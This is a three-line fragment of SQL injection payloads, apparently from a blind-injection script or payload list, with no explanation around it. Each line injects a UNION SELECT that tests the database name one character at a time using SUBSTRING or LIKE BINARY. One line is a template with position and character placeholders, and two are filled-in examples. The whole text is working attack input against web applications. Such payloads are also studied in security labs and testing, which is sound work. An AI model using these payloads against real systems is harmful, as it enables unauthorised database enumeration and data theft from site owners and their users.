 UNION SELECT 1,2,3,4 WHERE SUBSTRING(database(), {position}, 1) = BINARY '{character}' -- -
 ' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY 'a%' -- -
 a' UNION SELECT 1,2,3,4 WHERE SUBSTRING(database(), 1, 1) = BINARY 'm' -- -
 
